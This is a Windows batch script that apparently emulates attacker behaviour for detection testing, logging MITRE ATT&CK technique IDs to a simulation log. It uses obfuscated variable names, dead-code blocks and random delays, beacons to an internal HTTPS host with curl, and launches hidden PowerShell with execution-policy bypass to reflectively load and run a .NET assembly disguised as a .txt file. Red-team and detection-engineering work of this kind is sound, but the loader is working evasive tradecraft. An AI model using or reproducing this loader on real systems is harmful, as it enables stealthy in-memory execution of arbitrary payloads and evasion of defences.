@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET txisnba=%APPDATA%\8592\ab15e9fe
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8592-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=firelox.txt
SET dvhhyc=8592
SET logfile=%APPDATA%\!rrocubc!\macula-simulations.log
SET pllzv=0
SET ncfgl=1
SET fvmkgt=2
SET qwerty=3

echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: script_start=ok>> "!logfile!" 2>nul
ping -n 31 127.0.0.1 >nul
SET /A xbdgy=%RANDOM% %% 20 + 10
timeout /t !xbdgy! /nobreak >nul
SET state=!pllzv!
GOTO ytrewq

:asdfgh
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: dead_code_reached=0>> "!logfile!" 2>nul
GOTO zxcvbn

:ytrewq
IF !state!==!pllzv! GOTO qazwsx
IF !state!==!ncfgl! GOTO edcrfv
IF !state!==!fvmkgt! GOTO tgbyhn
IF !state!==!qwerty! GOTO ujmikol

:poiuyt
REM Dead code block
SET fake=dead
GOTO zxcvbn

:qazwsx
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_start=ok>> "!logfile!" 2>nul
curl -k -s -o nul "!keghkgto!"
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_complete=ok>> "!logfile!" 2>nul
SET result=1
SET err=
echo [%DATE% %TIME%][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1105|Ingress Tool Transfer=!result!:!err!>> "!logfile!" 2>nul
CHOICE /C Y /N /D Y /T 8 >nul
SET state=!ncfgl!
GOTO ytrewq

:lkjhgf
REM Unreachable junk
EXIT /B 1

:edcrfv
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: directory_change_start=!txisnba!>> "!logfile!" 2>nul
cd /d "!txisnba!" 2>nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: directory_change_complete=!cd!>> "!logfile!" 2>nul
timeout /t 6 /nobreak >nul
SET state=!fvmkgt!
GOTO ytrewq

:mnbvcx
REM Dead code
SET junk=never

:tgbyhn
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: assembly_load_start=!xzanpex!>> "!logfile!" 2>nul
SET pwsh=powershell.exe
!pwsh! -nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('!xzanpex!')).EntryPoint.Invoke($null, @(,[string[]]@())) }"
IF !ERRORLEVEL!==0 (SET result=1&SET err=) ELSE (SET result=0&SET err=assembly_load_failed)
echo [%DATE% %TIME%][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!result!:!err!>> "!logfile!" 2>nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: assembly_load_complete=!result!>> "!logfile!" 2>nul
SET state=!qwerty!
GOTO ytrewq

:ujmikol
timeout /t 12 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: script_end=clean>> "!logfile!" 2>nul

:zxcvbn
ENDLOCAL